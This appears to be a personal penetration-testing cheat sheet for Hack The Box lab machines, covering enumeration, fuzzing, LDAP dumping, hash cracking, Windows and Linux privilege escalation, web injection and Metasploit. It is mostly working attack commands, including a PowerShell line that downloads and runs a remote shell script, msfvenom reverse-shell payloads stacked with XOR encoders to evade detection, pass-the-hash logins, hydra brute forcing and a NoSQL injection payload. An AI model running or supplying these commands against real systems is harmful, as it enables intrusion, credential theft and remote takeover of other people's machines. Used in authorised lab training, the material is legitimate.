Paths are for KALI

# Enumeration

## Port Discovery

List all ports with possible vulnerabilities

    $ nmap -p4386 -v -sS -sV --script vuln 10.10.10.178

You can also use netcat to do port scanning

    $ nc -zv localhost 1-65535

## Web Fuzzing

Fuzzing page

    $ wfuzz -Z -c -z file,/usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://10.10.10.158/FUZZ

Fuzzing vhosts

    $ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -H "Host: FUZZ" http://testphp.vulnweb.com/

Fuzzing for backup:

    $ wfuzz -Z -c -z file,/usr/share/dirb/wordlists/mutations_common.txt --hc 404 http://10.10.10.156/index.html.FUZZ 

Also .something.swp for VIM

Combining multiples sources:

   $ wfuzz -z file,big.txt -z file,common.txt --hc 404 http://forwardslash.htb/FUZZ/FUZ2Z.php

## LDAP

List users:

    ldapsearch -h 10.10.10.161 -p 389 -x -b 'DC=htb,DC=local' "*" "*" + | egrep "^sAMAccountName" | sed "s/sAMAccountName: //g" > users.txt

Find if an entry password exits:

    ldapsearch -h 10.10.10.161 -p 389 -x -b 'CN=htb,DC=local' "(sAMAccountName=*)" "*" + | egrep -i "(password|pwd|pass|passwd)"

## DNS

Zone transfert

    # host -l domain nameserver

# Cracking

Identify Hash : `# hash-identifier`

Running John:

    # john --format=dynamic_82 --wordlist=wordlist.txt --rules=d3ad0ne hash.txt

List formats:

    # john --list=format-details

Password with known part:

    # john --format=dynamic_1034 --wordlist=/usr/share/wordlists/rockyou.txt --mask='?wknown-part' hashes.txt

A lot of scripts to convert to JOHN are under /usr/share/john/

Cracking with hashcat:

    # hashcat --example-hashes | grep -i -B 1 -A 1 filezilla
    # hashcat --force -m 15000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt


# Servers

## Detecting incoming connections

For ICMP

    tcpdump -i tun0 icmp

## HTTP Server

Share your local directory

    python3 -m http.server 80

## Samba Server

    # cat /etc/samba/smb.conf
    [htb]
    path=/smb/
    browseable = yes
    read only = yes
    create mask = 777
    guest ok = yes
    
    [upload]
    path=/root/htb/sniper/upload/
    browseable = yes
    read only = no
    create mask = 777
    directory mask = 755
    guest ok = yes
    writeable = yes
    
    # service nmbd start
    # service smbd start

## Simple FTP

Twisted

    twistd -n ftp

# Windows

## Tools

 - Bloodhound: discover vulnerabilities in your AD. You need to run `Invoke-BloodHound -Domain <DOMAIN> -LDAPUser <USER> -LDAPPass <PASS> -CollectionMethod All -DomainController <DomainController>  -ZipFileName data.zip` to get the data to feed Bloodhound.

 - Invoke-ACLPwn: Useful if the user has the WriteDACL right
 - [Evil-RM](https://github.com/Hackplayers/evil-winrm) : shell to connect to WinRM
 - enum4linux

## Enumeration

    systeminfo
    net users
    net groups

Get all infos about user:

    whoami /all

With SEImpersonification, have a look to [LovelyPotato](https://github.com/TsukiCTF/Lovely-Potato)


Querying the registery

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

Querying the registry with PowerShell

    Get-ChildItem -Path Registry::HKLM\SOFTWARE\Wow6432Node\ # Display property
    (Get-ItemProperty -Path Registry::HKLM\SOFTWARE\an\item).subkey
    
Find all files with the word password, case insensitive

    PS C:> findstr /smi password *

List contents of shares:

    smbmap -R -u <USER> -p <PASS> -H 10.10.10.151

Retrieve a folder recursively:

    smbget -R -U User smb://10.10.10.178/SHARE\$/XXX/

Display tree
    
    tree /F /A

View rights of a directory

     icacls <dir>

## Powershell

Running remote script directly

    PS C:> IEX (New-Object Net.WebClient).DownloadString(‘https://10.10.14.8/shell.ps1’)

Run WinRM commands from powershell:

    $username = 'HOST\Login'
    $password = '<PASS>'
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    Invoke-Command -Credential $credential -ScriptBlock { whoami } -Computer $computer

Execute command from PowerShell

    cmd /r dir /s /b

## Common attacks

 - GetNPUsers.py (from impacket): This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).

    GetNPUsers.py domain/user -no-pass

 - Pass the hash: You can connect using the hash of the user

    evil-winrm -i htb.local -u ADMINISTRATOR --hash 32693b11e6aa90eb43d32c72a07ceea6

 - Credentials can be saved

    cmdkey /list
    cmdkey /add:<DOMAIN>\<USER> /user:<USER> /pass:<PASS>
    runas /savecred /user:<DOMAIN>\<USER> cmd



## WTFs?

You can hide informations in a Alternate Data Stream. You can detect with smbclient:

    smbclient -U LOGIN \\\\10.10.10.178\\C\$\\ <PASS>
    > cd xxx
    > allinfo a_file
    ...
    stream: [:<STREAM_NAME>:$DATA], 15 bytes

You can [view ADS with smbclient from Linux](https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux)

    smbclient -U <LOGIN> //<IP>/<SHARE> <PASS>
    more PATH/TO/FILE:<STREAM NAME>:$DATA

Or with powershell:

    Get-Item -Path .\a_file  -Stream *
    Get-Content -Path .\a_file -Stream the_stream

# Linux

## Enumeration

 - [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
 - [linuxprivesc](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

Basic user info:

    # id

View environment variables

    # export

View running services:

    # netstat

### Find interesting files

Find backups files:

    # find / -name *.bak 2> /dev/null

Find keys:

    # find / -name id_* 2> /dev/null

Find hidden files:
 
    # find / -name ".*" 2> /dev/null

Find a file owned by a group or a user:

    # find / -user root -group root -type f

Find files with specific permissions:

    # find / -perm -4000 -type f # With suid
    # find / -perm /u=w -type d -user qtc # User qtc has write access to a directory

Find files modified from a date:

    # find . -type f -newermt 2020-02-11 -exec ls -l {} \; 

## Misc

Port forwarding to access a local postgres server:

    # ssh -i ~/.ssh/id_ed25519 -L 10.11.12.14:5432:127.0.0.1:5432 user@10.10.10.10


## Getting root

 - Find file with sticky bit: find / -type d -perm -1000 -exec ls -ld {} \;
 - Exec with capabilities
 - Running services with elevated privileges
 - sudo -L. Running vim/less/journalctl/... can give you a shell. [GTFOBins](https://gtfobins.github.io/) lists mutliple ways to execute a command from an editor. Also, you might need to resize your windows to create a shell.
 - SSH keys
 - crontab
 
## Tools

# Web Attacks

 - Hidden comments in source code (paths, password, ...)
 - SQLi

```
# sqlmap -u http://10.10.10.151/user/login.php --data 'username=test&password=test&submit
```

 - NoSQLi

    curl http://site/ --data "username[$ne]=toto&password[$ne]=toto&Submit=Sign+in"

 - BruteForce Online

    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  website  http-post-form "/:username=^USER^&password=^PASS^&login=login:Forgot Password"


# Metasploit

## Msfconsole

Finding a specific exploit

    msf5 > grep eternal search blue



## Meterpreter

Generate meterpreter

    # msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.14.8 lport=4444 verbose=true -f exe -o reverse.exe
    # msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.28 lport=80 verbose=true -f raw | msfvenom --platform windows -a x64 -e x64/xor -i 42 -f raw | msfvenom -a x64 --platform windows -e x64/xor_context -i 17 -f raw | msfvenom -a x64 --platform windows -e x64/xor_dynamic -i 30 -f exe -o /smb/reverse.exe 

List paylods

    # msfvenom --list payloads
    # msfvenom  -p windows/x64/vncinject/reverse_winhttps --list-options

Start wait:

    # msfconsole
    msf5 > use exploit/multi/handler 
    msf5 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp 

Put on the machine and run 

Port forwarding (to access a local service from a remote machine)

    meterpreter > portfwd add -L <local host> -l <local port> -r <remote host> -p <remote port>

# Reversing

 - Ghidra
 - IDA
 - [.Net Reflector](https://www.red-gate.com/products/dotnet-development/reflector/)

# MISC 

## Python

 * [Simple IPv4 TCP client](client.py)
 * [Simple IPv6 HTTP server](server.py)
 * [Snippet (md5, regex ...)](snippet.py)

## Good practices

Put all users in users.txt and all passwords in passwords.txt. Use scanners from msfconsole to easily test all posibilities.


Find CVE

    # searchsploit filezilla

## Resources

 - [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
 - [How to attack kerberos](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
